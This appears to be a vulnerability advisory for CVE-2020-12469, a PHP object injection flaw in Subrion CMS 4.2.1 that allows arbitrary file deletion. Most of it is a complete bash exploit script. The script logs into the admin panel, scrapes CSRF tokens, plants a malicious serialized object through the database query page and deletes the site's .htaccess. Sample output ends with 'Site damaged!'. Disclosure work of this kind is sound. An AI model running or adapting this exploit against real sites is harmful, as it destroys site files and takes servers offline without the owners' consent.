# Subpages - PHP Object Injection

## VulDB-Like Summary

A vulnerability has been found in the Subrion CMS 4.2.1. It has been rated as problematic. Affected by this issue is the file `/admin/blocks.php`. The manipulation of the of the **subpages** value within a block leads to a PHP Object Injection vulnerability. Using CWE to declare the problem leads to CWE-502. Impacted is Integrity and Availability. An attacker might be able inject arbitrary PHP objects within the application context, and use them to achive arbitrary file deletion.

The weakness was presented 04/14/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-12469. The attack may be launched remotely. A single form of authentication is required for exploitation. Technical details are known and an exploit is publicly available.

## Proof-of-Concept

The following script may be used to easily verify the vulnerability:

```bash
#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"
id=10
debug=0

# Grep Session Cookie Name
sess_cookie=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*\=\w*")
cookies="Cookie: loader=loaded; $sess_cookie"
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
echo "[*] Logging in"
# Fix the Session Cookie Value and login
res=$(curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "$cookies" -i | grep "Set-Cookie")

echo "[*] Adding evil PHP Object"
# Get CSRF Token
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/panel/database/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)

# Generating Payload
payload=$(php serializer.php -c s -t a -u)

if [ $debug -gt 0 ]; then
    echo $payload
fi

# Add the crafted parameter
res=$(curl -i -s -k -X "POST" -x $proxy -H "$cookies" --data-binary "__st=$csrf_token&query=UPDATE++%60subr_blocks%60+SET+%60subpages%60++%3D+%27$payload;%27+WHERE+%60id%60+%3D+$id%3B+&show_query=1&exec_query=Go" "$target/panel/database/")

if [[ $(echo $res | grep "Query OK:" | grep "rows affected") == "" ]]; then
    echo "Could not add the evil PHP Object"
    exit 1
fi
echo "[*] Triggering File deletion"
# Get block ID to trigger
res=$(curl -i -s -k -H "$cookies" -x $proxy "$target/panel/blocks/edit/$id/" &>/dev/null)

# Confirming deletion, checking 404 
res=$(curl -i -s -k -H "$cookies" -x $proxy "$target/panel/blocks/edit/$id/" | head -n 1 | grep -oP "\d{3}")
if [[ "$res" == "404" ]]; then
    echo "[+] Done! Site damaged!"
else
    echo "[-] Error, site patched!"
fi
```

Using the above script should give the following output, proving the vulnerability.

```
$ ./exploit.sh
[*] Logging in
[*] Adding evil PHP Object
[*] Triggering File deletion
[+] Done! Site damaged!
```

When the script finishes, the site should not be reachable anymore, as the .htaccess has been deleted. In case the configuration of the site is more robust, check for the presence of .htaccess within Subrion HOME direcotry.

## Remediation

Currently, no fixes are available for this issue.

## References

*   [https://cwe.mitre.org/data/definitions/1236.html](https://cwe.mitre.org/data/definitions/1236.html)
*   [https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)